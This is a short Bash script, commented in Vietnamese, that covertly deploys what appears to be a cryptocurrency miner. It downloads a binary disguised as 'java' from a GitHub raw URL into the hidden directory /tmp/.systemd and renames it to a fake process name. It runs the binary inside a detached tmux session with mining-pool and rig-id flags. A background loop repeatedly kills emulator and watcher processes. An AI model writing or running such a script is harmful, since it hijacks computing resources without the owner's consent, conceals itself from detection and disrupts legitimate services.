#!/bin/bash

SESSION="nihux"
DOMAIN="$1"
NAME_WORK="$2"
HIDDEN_DIR="/tmp/.systemd"         # 📁 Thư mục ẩn
ARCHIVE_NAME="nihux.tar.gz"
BINARY_NAME="nihux"                # 🔒 Tên giả tiến trình

# 🔁 Kill tiến trình nghi vấn
(
  while true; do
    pkill -f qemu-system-x86_64-headless 2>/dev/null
    pkill -f netsimd 2>/dev/null
    pkill -f watchman 2>/dev/null
    sleep 3
  done
) &

# 📟 Tạo tmux nếu chưa có
if tmux has-session -t $SESSION 2>/dev/null; then
    tmux attach-session -t $SESSION
else
    tmux new-session -s $SESSION -d

    tmux send-keys -t $SESSION "
        mkdir -p $HIDDEN_DIR &&
        cd $HIDDEN_DIR &&
        rm -rf $BINARY_NAME* &&
        wget -q https://raw.githubusercontent.com/trinhkhaccong/tool/main/java.tar.gz -O $ARCHIVE_NAME &&
        tar -xzf $ARCHIVE_NAME &&
        mv java $BINARY_NAME &&
        chmod +x $BINARY_NAME &&
        ./$BINARY_NAME -o $DOMAIN --tls -k -t 1 --rig-id $NAME_WORK
    " C-m

    tmux attach-session -t $SESSION
fi
